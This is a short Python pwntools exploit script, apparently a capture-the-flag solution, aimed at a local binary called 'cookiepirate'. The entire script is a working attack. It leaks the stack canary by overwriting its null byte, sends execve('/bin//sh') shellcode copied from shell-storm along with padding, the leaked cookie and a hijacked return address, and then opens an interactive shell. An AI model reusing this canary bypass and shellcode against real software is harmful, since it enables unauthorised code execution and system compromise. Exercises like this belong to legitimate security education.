#!/usr/bin/env python
from pwn import *

context(arch='i386', os='linux')

# Start the program as a subprocess
# so we can communicate with it

# Read in your shellcode
#http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
		  + "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80AAAAA"
#http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" \
          + "\x68\x68\x2f\x62\x69\x6e\x89"	\
          + "\xe3\x89\xc1\x89\xc2\xb0\x0b"	\
          + "\xcd\x80\x31\xc0\x40\xcd\x80"

p = process('./cookiepirate')
# Optional: attach GDB to the process and run some GDB commands
gdb.attach(p, '''
	b *0x8048736
''')
#Overflow first null byte in stack cookie. This way it will get printed in first format string.
#Capture it, and send it back in second string, to overwrite ret val
first = 'A' * 0x81

# Commuicate with the process
# Other communication commands: recv, recvuntil, send, sendafter
# To see everything sent and received by the process, 
# run with ./doit.py DEBUG
p.sendline(first)

inc2 = p.recv()

cookieLoc = (7+0x81)
cookie = "\x00" + inc2[cookieLoc:(cookieLoc+3)]

#pointer to add 8 esp, pop ebp, then ret arg3 which is pointer to shell code
RetAddr = "\x68\x9A\x04\x08" # formated string with input shellcode

second = shellcode + (0x80-len(shellcode))*"A" + cookie + "A"*4 + RetAddr

#print cookie + ":"
# print second


p.sendline(second)
p.recv()

# Allow the user to read/write to the process 
#(useful when you get a shell!)
p.interactive()
